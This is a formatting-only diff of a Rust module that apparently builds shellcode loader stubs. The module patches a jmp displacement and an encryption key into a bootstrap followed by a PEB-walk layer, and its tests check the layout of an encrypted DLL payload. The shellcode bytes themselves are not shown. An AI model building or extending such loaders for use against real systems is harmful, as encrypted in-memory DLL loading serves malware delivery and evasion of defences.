@@ -138,8 +138,7 @@ pub fn generate_loader_stub(config: &LoaderConfig) -> Vec<u8> {
     // the displacement targets the first byte of LAYER2_PEB_WALK. We patch the
     // displacement here so the emitter stays the single source of truth for the
     // per-config layout.
-    let mut blob =
-        Vec::with_capacity(LAYER1_BOOTSTRAP.len() + KEY_LEN + LAYER2_PEB_WALK.len());
+    let mut blob = Vec::with_capacity(LAYER1_BOOTSTRAP.len() + KEY_LEN + LAYER2_PEB_WALK.len());
     blob.extend_from_slice(LAYER1_BOOTSTRAP);
 
     // Sanity: the bootstrap reserved exactly a 32-byte key slot at the offset
@@ -170,8 +169,7 @@ pub fn generate_loader_stub(config: &LoaderConfig) -> Vec<u8> {
     // rel32 = target - (jmp_instr_end).
     let jmp_instr_end = LAYER2_JMP_OFFSET + 5;
     let rel32 = (layer2_start as isize - jmp_instr_end as isize) as i32;
-    blob[LAYER2_JMP_OFFSET + 1..LAYER2_JMP_OFFSET + 5]
-        .copy_from_slice(&rel32.to_le_bytes());
+    blob[LAYER2_JMP_OFFSET + 1..LAYER2_JMP_OFFSET + 5].copy_from_slice(&rel32.to_le_bytes());
 
     // Defensive self-match guard: the on-target scanner walks every 4-byte
     // window of the stub looking for NYX2_MAGIC. Layer 1 recovers the magic in
@@ -184,7 +182,8 @@ pub fn generate_loader_stub(config: &LoaderConfig) -> Vec<u8> {
     let magic_bytes = NYX2_MAGIC.to_le_bytes();
     for (i, w) in blob.windows(4).enumerate() {
         debug_assert_ne!(
-            w, &magic_bytes[..],
+            w,
+            &magic_bytes[..],
             "emitted stub contains NYX2_MAGIC at offset {i} (key likely contains a 4-byte \
              match); re-roll LoaderConfig.key"
         );
@@ -316,8 +315,8 @@ mod tests {
             &LAYER1_BOOTSTRAP[..LAYER2_JMP_OFFSET],
         );
         assert_eq!(stub[LAYER2_JMP_OFFSET], 0xE9); // jmp rel32 opcode
-        // The 4 bytes after the opcode are the displacement; verify the
-        // emitter computed it to land exactly at the Layer-2 start.
+                                                   // The 4 bytes after the opcode are the displacement; verify the
+                                                   // emitter computed it to land exactly at the Layer-2 start.
         let layer2_start = KEY_PATCH_OFFSET + KEY_LEN;
         let jmp_instr_end = LAYER2_JMP_OFFSET + 5;
         let want_disp = (layer2_start as isize - jmp_instr_end as isize) as i32;
@@ -334,7 +333,10 @@ mod tests {
         );
 
         // The 32-byte key is patched in at KEY_PATCH_OFFSET.
-        assert_eq!(&stub[KEY_PATCH_OFFSET..KEY_PATCH_OFFSET + KEY_LEN], &config.key);
+        assert_eq!(
+            &stub[KEY_PATCH_OFFSET..KEY_PATCH_OFFSET + KEY_LEN],
+            &config.key
+        );
 
         // Layer 2 follows the key verbatim.
         assert_eq!(&stub[layer2_start..], LAYER2_PEB_WALK);
@@ -360,9 +362,7 @@ mod tests {
 
         // encrypted_len at stub_len + 4.
         let enc_len_off = stub_len + 4;
-        let enc_len = u32::from_le_bytes(
-            payload[enc_len_off..enc_len_off + 4].try_into().unwrap(),
-        );
+        let enc_len = u32::from_le_bytes(payload[enc_len_off..enc_len_off + 4].try_into().unwrap());
         assert_eq!(enc_len, dll.len() as u32);
 
         // nonce at stub_len + 8.
@@ -402,9 +402,8 @@ mod tests {
 
         let stub_len = expected_stub_len();
         // Read encrypted_len from the payload header
-        let enc_len = u32::from_le_bytes(
-            payload[stub_len + 4..stub_len + 8].try_into().unwrap(),
-        ) as usize;
+        let enc_len =
+            u32::from_le_bytes(payload[stub_len + 4..stub_len + 8].try_into().unwrap()) as usize;
 
         // ciphertext + tag starts right after the nonce
         let ct_off = stub_len + 20;
@@ -446,7 +445,10 @@ mod tests {
         // …magic and encrypted_len match…
         assert_eq!(&p1[stub_len..stub_len + 8], &p2[stub_len..stub_len + 8]);
         // …the nonce field differs…
-        assert_ne!(&p1[stub_len + 8..stub_len + 20], &p2[stub_len + 8..stub_len + 20]);
+        assert_ne!(
+            &p1[stub_len + 8..stub_len + 20],
+            &p2[stub_len + 8..stub_len + 20]
+        );
         // …and the ciphertext differs (different nonce → different keystream).
         assert_ne!(&p1[stub_len + 20..], &p2[stub_len + 20..]);
     }
@@ -471,7 +473,7 @@ mod tests {
             &p1[KEY_PATCH_OFFSET + KEY_LEN..stub_len],
             &p2[KEY_PATCH_OFFSET + KEY_LEN..stub_len],
         ); // Layer 2 same
-        // Ciphertext also differs (different key).
+           // Ciphertext also differs (different key).
         assert_ne!(&p1[stub_len + 20..], &p2[stub_len + 20..]);
     }
 
@@ -494,9 +496,7 @@ mod tests {
         assert_eq!(payload.len(), stub_len + 36);
 
         // encrypted_len should be 0
-        let enc_len = u32::from_le_bytes(
-            payload[stub_len + 4..stub_len + 8].try_into().unwrap(),
-        );
+        let enc_len = u32::from_le_bytes(payload[stub_len + 4..stub_len + 8].try_into().unwrap());
         assert_eq!(enc_len, 0);
 
         // Decrypt should recover empty DLL
